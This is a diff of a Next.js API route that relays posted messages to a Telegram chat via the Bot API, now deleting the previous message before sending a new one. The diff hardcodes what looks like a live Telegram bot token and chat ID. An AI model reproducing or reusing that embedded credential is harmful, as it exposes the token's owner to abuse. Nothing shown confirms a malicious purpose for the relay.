@@ -1,31 +1,45 @@
 import { NextRequest, NextResponse } from 'next/server';
 
 
-const TOKEN = '';
-const CHAT_ID = '';
+const TOKEN = '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA';
+const CHAT_ID = '7211586401';
 
 const POST = async (req: NextRequest) => {
     try {
         const body = await req.json();
-        const { message, message_id } = body;
+        const { message, old_message_id } = body;
 
         if (!message) {
             return NextResponse.json({ success: false }, { status: 400 });
         }
+
+        // Xóa tin nhắn cũ nếu có
+        if (old_message_id) {
+            try {
+                const deleteUrl = `https://api.telegram.org/bot${TOKEN}/deleteMessage`;
+                await fetch(deleteUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        message_id: old_message_id
+                    })
+                });
+            } catch {
+                // Bỏ qua lỗi xóa tin nhắn
+            }
+        }
+
+        // Gửi tin nhắn mới
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-        const payload: {
-            chat_id: string;
-            text: string;
-            parse_mode: string;
-            reply_to_message_id?: number;
-        } = {
+        const payload = {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'HTML'
         };
-        if (message_id) {
-            payload.reply_to_message_id = message_id;
-        }
+
         const response = await fetch(url, {
             method: 'POST',
             headers: {
